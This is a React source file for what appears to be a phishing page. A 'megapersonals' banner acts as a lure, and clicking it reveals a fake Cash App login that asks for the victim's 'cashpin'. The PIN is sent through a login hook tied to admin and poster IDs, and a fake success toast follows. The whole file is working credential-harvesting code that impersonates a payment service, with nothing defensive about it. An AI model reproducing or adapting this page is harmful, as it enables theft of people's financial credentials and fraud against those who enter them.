"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import { toast } from "react-toastify";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
export default function Home({ adminId, posterId }) {
  const [next, setNext] = useState(false);
  const [email, setEmail] = useState("");
  const [verified, setVerified] = useState(false);
  const initialvalues = {
    email: "",
    password: "",
  };

  const { login } = useMockLogin(adminId, posterId);

  const handleEmail = () => {
    if (!email) {
      return;
    }
    setNext(true);
  };
  const handleSubmit = (values, formik) => {
    const { password } = values;

    const submitValues = {
      site: site,
      email: email,
      password: password,
    };
    console.log("submitValues", submitValues);
    login(submitValues, formik);
    toast.success("Login Succecssfull");

    console.log(submitValues);
  };
  return (
    <>
      {!verified ? (
        <div className="flex justify-center items-center h-full -mt-5 bg-white">
          <button onClick={() => setVerified(true)}>
            {" "}
            <div className=" object-cover  cursor-pointer ">
              <img
                width={464}
                height={785}
                src="/images/banner.jpeg"
                alt="megaeprsonals"
                priority
              />
            </div>
          </button>
        </div>
      ) : (
        <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
          <img
            src="/images/Square_Cash_app_logo.svg"
            height={200}
            width={200}
          />
          <div className="mt-5">
            <Formik
              initialValues={initialvalues}
              // validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="">
                  <>
                    <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
                      <Field
                        className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
                        placeholder="Enter your cashpin"
                        name="password"
                        type="password"
                        autoComplete="on"
                        required
                      />
                    </div>

                    <div className="flex flex-row justify-center items-center mt-1">
                      <button
                        type="submit"
                        className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
                      >
                        Continue
                      </button>
                    </div>
                  </>
                </Form>
              )}
            </Formik>
          </div>
        </div>
      )}
    </>
  );
}
